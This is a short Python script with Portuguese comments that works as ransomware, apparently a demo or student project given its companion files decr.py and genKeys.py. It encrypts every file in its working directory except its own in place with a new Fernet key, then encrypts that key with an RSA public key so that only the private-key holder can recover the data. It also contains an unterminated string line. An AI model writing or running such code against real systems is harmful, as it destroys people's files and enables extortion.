from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import os
import time

print('Ataque iniciado: ')
time.sleep(10)

all_aim_files = []
path = '

#check de qual files tem na pasta
skip_files = ['decr.py', 'attack.py', 'private_key.pem', 'requirements.txt', 'setup.py',
              'public_key.pem', 'private_key.pem', 'genKeys.py', 'secret_key.key',
              'attack', 'frozen_application_license.txt']


for file in os.listdir():
    if os.path.isfile(file) and file not in skip_files:
        all_aim_files.append(file)

print(all_aim_files)

key = Fernet.generate_key()

with open('secret_key.key', 'wb') as my_key:
    my_key.write(key)

#para cada arquivo, criptografar o arquivo com a key
for file in all_aim_files:
    with open(file, 'rb') as file_x:
        content = file_x.read() #lendo o determinado arquivo e salvando em content
    
    content_encr = Fernet(key).encrypt(content) #conteúdo criptografado

    with open(file, 'wb') as file_x:
        file_x.write(content_encr)

with open('public_key.pem', 'rb') as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read()
    )

with open('secret_key.key', 'rb') as my_key:
    secret_key = my_key.read()


secret_encrypt = public_key.encrypt(secret_key, 
                                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                 algorithm=hashes.SHA256(),
                                                 label=None)
                                    )

with open('secret_key.key', 'wb') as my_key:
    my_key.write(secret_encrypt)


print('Attack realizado com sucesso')
time.sleep(10)
